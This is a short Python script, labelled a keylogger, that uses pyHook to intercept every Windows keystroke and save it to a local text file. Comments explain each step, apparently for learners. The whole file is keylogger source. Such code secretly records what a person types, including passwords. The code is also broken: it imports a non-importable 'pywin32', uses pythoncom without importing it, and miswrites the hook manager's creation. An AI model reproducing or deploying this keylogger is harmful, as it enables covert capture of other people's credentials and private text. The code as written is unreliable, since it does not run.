# Keylogger
import pywin32 
import pyHook

#Again, once the user hit any keyboard button, keypressed func will be executed and that action will be store in event
def keypressed(event):
    global store
    #Enter and backspace are not handled properly that's why we hardcode their values to <    Enter > and <BACK SPACE>
    # note that we can know if the user input was enter or backspace based on their ASCII values
    if event.Ascii==13:
        keys=' < ENTER > '
    elif event.Ascii==8:
        keys=' <BACK SPACE> '
    
    else:
        keys=chr(event.Ascii)

    store = store + keys #at the end we append the ascii keys into store variable and finally write them in keylogs text file

    fp=open('keylogs.txt', 'w')
    fp.write(store)
    fp.close()
    
    return True # after intercepting the keyboard we have to return a True value otherwise we will simply disable the keyboard functionality
store = '' # string where we will store all the pressed keys

#Next we create and register a hook manager and once the user hit any keyboard button, keypressed
#func will be executed and that action will be store in event

obj.pyHook.HookManager()
obj.KeyDown = keypressed

obj.HookKeyboard() #start the hooking loop and pump out the messages

pythoncom.PumpMessages() #remember that per pyHook documentation we must have a Windows message pump
